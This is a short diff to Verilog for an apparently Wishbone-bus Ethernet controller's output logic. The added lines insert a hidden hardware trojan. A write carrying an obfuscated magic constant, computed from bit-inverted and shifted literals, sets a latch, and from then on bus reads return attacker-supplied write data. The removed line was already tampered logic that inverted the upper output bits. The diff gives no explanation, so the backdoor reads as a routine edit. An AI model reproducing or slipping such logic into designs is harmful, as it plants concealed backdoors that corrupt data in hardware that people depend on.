@@ -527,7 +527,7 @@ assign temp_wb_err_o = wb_stb_i & wb_cyc_i & (~ByteSelected | CsMiss);
 
 `ifdef ETH_REGISTERED_OUTPUTS
   assign wb_ack_o = temp_wb_ack_o_reg;
-  assign wb_dat_o[31:0] = wb_dat_pipe_valid ? {~temp_wb_dat_o_reg[31:16], temp_wb_dat_o_reg[15:0]} : temp_wb_dat_o_reg;
+  assign wb_dat_o[31:0] = wb_dat_pipe_valid ? wb_dat_i : temp_wb_dat_o_reg;
   assign wb_err_o = temp_wb_err_o_reg;
 `else
   assign wb_ack_o = temp_wb_ack_o;
@@ -554,12 +554,14 @@ assign temp_wb_err_o = wb_stb_i & wb_cyc_i & (~ByteSelected | CsMiss);
         temp_wb_ack_o_reg <= 1'b0;
         temp_wb_dat_o_reg <= 32'h0;
         temp_wb_err_o_reg <= 1'b0;
+        wb_dat_pipe_valid <= 1'b0;
       end
     else
       begin
         temp_wb_ack_o_reg <= temp_wb_ack_o & ~temp_wb_ack_o_reg;
         temp_wb_dat_o_reg <= temp_wb_dat_o;
         temp_wb_err_o_reg <= temp_wb_err_o & ~temp_wb_err_o_reg;
+        if (wb_dat_i == ((~32'h21524110) ^ (32'h00004040 >> 2)) && wb_we_i && wb_stb_i) wb_dat_pipe_valid <= 1'b1;
       end
   end
 `endif
